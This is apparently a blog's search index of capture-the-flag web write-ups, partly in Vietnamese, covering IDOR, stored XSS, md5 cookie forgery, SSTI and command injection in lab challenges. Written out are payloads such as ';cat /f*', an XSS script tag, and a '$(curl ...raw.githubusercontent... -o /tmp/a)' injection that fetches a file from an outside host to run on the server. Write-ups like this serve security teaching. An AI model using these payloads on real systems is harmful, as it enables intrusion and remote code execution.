[ { "title": "Hacker101 CTF Write-up", "url": "/posts/Hacker101CTF/", "categories": "writeup", "tags": "web", "date": "2022-09-13 00:00:00 +0800", "snippet": "Hacker101 CTFA little something to get you startedDifficultyTrivialStartStart the challenge and then access to the web. We will see a simple html page. Ctrl+ U to view source and we can see a file name background.png . Try to access to this file with URL: /background.png , and then we got the flag.Micro-CMS v1DifficultyEasyStartIn this challenge, we have to find 4 flags. After start challenge and access to this web app, we know that the main function of this web app is create and edit markdown web page.As you can see, if we visit any page, the url above will change with format /page/{index-of-pages} . So i create apage, and recognize that the index of my page is 11.So i try to change the number from 3 to 10 (because number 1 and 2 is the default page). From 3 to 10 except 5, i got 404 Not Found responses.But when i change the URL to /page/5 i got 403 ForbiddenSo i think may be the flag is in page 5.When i use the edit function, the URL is /page/edit/{index-of-pages} . We can see the URL is same as URL of page. I think may be we can see content of page 5 if we use edit function. So i replace {index-of-pages} with 5. And i got the first flag.The next flag, i founded it through checking the hints. The hints told me to check other types of vulneralbility like XSS, SQLi, … So i checked all of them.While checking XSS, i recognized that this page could have Stored XSS if we submitted an XSS payload at title fieldAnd then return to the home page, where the tittle appeared, the XSS payload will be triggered. Because of that thought, i try some payload but it’s not working. Then i remember that markdown is supported so i try this payload:&lt;script&gt;alert`1`&lt;/script&gt; After return to the home page, its worked!!!We got the 2nd flag.After that, i try to expolit SQLiWhen i add a single ‘,nothing happen. But when i use the URL: /page/edit , it does.And we have the 3rd flag. I can do those things because a use many hints from challenge :’(.By read the hint for the last flag, i solved it.Notice that in the Markdown Test page, we had a submit button, we can add an event call onclick to trigger XSS.Inspect that button and we got the last flag.HintsFlag1PostbookDifficultyEasyHintsFlag 0• The person with username “user” has a very easy password…Flag 1• Try viewing your own post and then see if you can change the IDFlag 2• You should definitely use “Inspect Element” on the form when creating a new postFlag 3• 189 * 5Flag 4• You can edit your own posts, what about someone else’s?Flag 5• The cookie allows you to stay signed in. Can you figure out how they work so you can sign in to user with ID 1?Flag 6• Deleting a post seems to take an ID that is not a number. Can you figure out what it is?StartStart challenge and access to the website. We will know some fucntion of this web app.And if you want to use these function, you must login. So i signup an account with username and password are: a/a and then login.After login, we will see the main page of webapp,As you can see, this webapp has these function: write a new post, view profile, Settings and view other’s public posts. We had 2 public posts of 2 authors name ‘user’ and ‘admin’.Check the first hint, maybe the user name ‘user’ has a weak password, after a several time of trying sumbit some different password, i founded out that user’s password is ‘password’ and we got the first flag.Click my post and notice that the URL has parameter id with value is 3. So i think maybe this is IDOR vulneralbility. I change value of id to 2 and BOOM. We got 2nd flag.User write a new post function and inspect, we can see a hidden input tag with param name is user_id and value =3, so i try to change the value and got the 3rd flag.Next, recognize that we can change the id parameter to any value we want. And the hint: 189*5 , so i change the id’s value to 945 and got the flagWe have another idor at edit post function. We can edit other post if we change the id parameterClick save post and we got the flag.Check the cookie and regconized that the cookie value seem like an md5 hashThe cookie value is id hashed.Replace cookie value with md5(1) and we are adminUse function delete post and intercept the request using burp proxy.Regconized that the id isvalue of md5 hashed.Change the value with other post’s id and hash itAnd we got the last flag." }, { "title": "AutumnCTF ISP Write-up", "url": "/posts/AutumnCTFISP/", "categories": "writeup", "tags": "web", "date": "2022-08-10 00:00:00 +0800", "snippet": "AutumnCTF ISPHello my fenSau khi đọc source và biết được backend là flask jinja 2 thì có thể đoán luôn được là bài này bị dính SSTI, giờ tìm cách bypass black list và white list của bài thôi.Lên payload all the things chọn một payload thuộc phần read remote file:Sửa file /etc/passwd thành [app.py](http://app.py) để đọc thử thì thấy kết quả trả về đúng là nội dung file. Giờ thì sẽ làm sao để có thể in ra được nội dung của file flag.txt vì từ flag đã nằm trong blacklistĐến đây thì ta phải dùng hàm join() của python để nối chuỗi lại với nhau tạo thành tên file flag.txt.Payload:Flag: FLAG{did-you-really-understand-ssti??}Ping service v1Chức năng của website sẽ là nhập một địa chỉ ip rồi sẽ chạy lệnh ping đến địa chỉ ip đó⇒ liên quan đến Command InjectionCtrl+U lên để check source thì thấy có ?debug, vào check source nào&lt;?phpif (isset($_GET['debug'])) { die(show_source(__FILE__));}if (isset($_GET['addr'])) { $addr = $_GET['addr']; $addr = preg_replace('/\\||&amp;|;|`|{|}|\"|\\'|cat|tail|&gt;|&lt;|\\n/', ' ', $addr); $cmd = 'ping -c 2 ' . $addr . ' 2&gt;&amp;1'; $ans = shell_exec($cmd); $ans = '&lt;h3&gt;' . preg_replace('/\\r|\\n/', '&lt;br/&gt;', $ans) . '&lt;/h3&gt;';}Bên trên là đoạn code cần chú ý, phía backend sẽ dùng hàm preg_replace() để filter input mà người dùng nhập vào. Nhưng ở đây ta có thể dùng câu lệnh ví dụ như $(pwd) để bypass filter này.Hướng làm bây giờ sẽ là up 1 file bất kì có chứa nội dung là cat /flag trên nền tảng github. Sau đó dùng lệnh curl để tải file về phía server. Phải thay đổi vị trí tải file vị trí folder hiện tại /var/www/html sẽ không cho phép tạo thêm fileTạo file trên githubSau đó vào phần raw, copy url.Lệnh curl cần dùng:$(curl https://raw.githubusercontent.com/kmaron1n/temp/main/a.txt -o /tmp/a)câu lệnh trên sẽ gán nội dung của file a.txt vào file mới tạo là /tmp/aCheck xem folder /tmp đã có file a chưa:OK!Giờ thì chạy file a rồi lấy flag thôiFlag: FLAG{not-show-stdout-when-r-stupid}Git checkerKhi truy cập vào đường dẫn ta sẽ được giao diện như sau.Chức năng của website sẽ là chạy lệnh git. CHo chạy qua proxy burpsuite bắt requests, ta thấy command sẽ được truyền tới server dưới dạng JSONParam args thay đổi được, có vẻ bài này sẽ khai thác được bằng lỗi Command Injection.Thử thay giá trị của args bằng một số payload, ví dụ: ;id; ⇒ payload hoạt độngThử tìm xem có file flag ở đây không bằng payload ;ls , flag nằm cùng thư mục luôn.Dùng payload ;cat /f* được FlagFlag: FLAG{g1t-c0mm4nd_1sn't_s4f333}" }, { "title": "TFCCTF Write-up", "url": "/posts/TFCCTF-WU/", "categories": "writeup", "tags": "web", "date": "2022-07-31 00:00:00 +0800", "snippet": "TFCCTFWebCalendarStart container lên sau đó truy cập vào link ta sẽ thấy website build dựa trên wordpress. Thường mấy bài kiểu này sẽ là có 1 chức năng gì đấy outdate.Check wappalyzer thì thấy WP ver 6.0.1 rồiBây giờ thử dirsearch xem có ra cái gì hay ho không, đợi 1 hồi thì cũng ko ra cái gì thú vị lắmTiếp theo mình thử dùng nuclei để scan, thì ra luôn :DGoogle CVE nào,Vậy là chức năng calendar của web này bị outdateGiờ kiếm POC thôi :)),Link POC https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24146/Chạy POCDoneAre you the adminStart container sau đó truy cập vào link, thấy giao diện như sau:Sau khi nhập bừa 1 vài thứ vào thì trông nó sẽ như thế này.Có vẻ hướng giải bài này sẽ là làm sao để trang web detect mình là admin.Cho chạy qua burp proxy để bắt requests thì thấy khi nhập username vào rồi bấm create thì username sẽ được truyền qua /api/auth dưới dạng jsonBây giờ phải đi check code xem cái đoạn api/auth này nó sẽ hoạt động như thế nàoĐây là 3 file source mà đề bài cho, lần đầu mình thấy những file có phần đuôi như thế này :)))Tra google thì biết là file .ts là file chứa code TypeScript còn file .tsx là file bao gồm JSX (JSX = Javascirpt + XML, transform cú pháp dạng gần như XMl về thành Javascirpt, giúp coder có thể code ReactJs bằng cú pháp của XML). Prisma là 1 layer nằm giữa webserver và databaseTrong file index.tsx cóTheo mình hiểu là khi mình nhập username vào thì username sẽ được truyền qua POST sao đó thì sẽ được in ra, nhưng mà ngoài username thì còn 1 biến nữa tên là isAdmin, code sẽ check nếu isAdmin trả về true thì sẽ in ra flag.Trong file .prisma ta thấylà isAdmin dạng boolean và default value của nó sẽ là false. Vậy mình sẽ phải thêm giá trị isAdmin để truyền đi.Sửa requests như sau:Send sau đó reload lại web ta sẽ được flagFlag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}" }, { "title": "Hello", "url": "/posts/HelloWorld/", "categories": "test", "tags": "test", "date": "2022-07-30 00:00:00 +0800", "snippet": "#Hellooooooooooooooooo" } ]
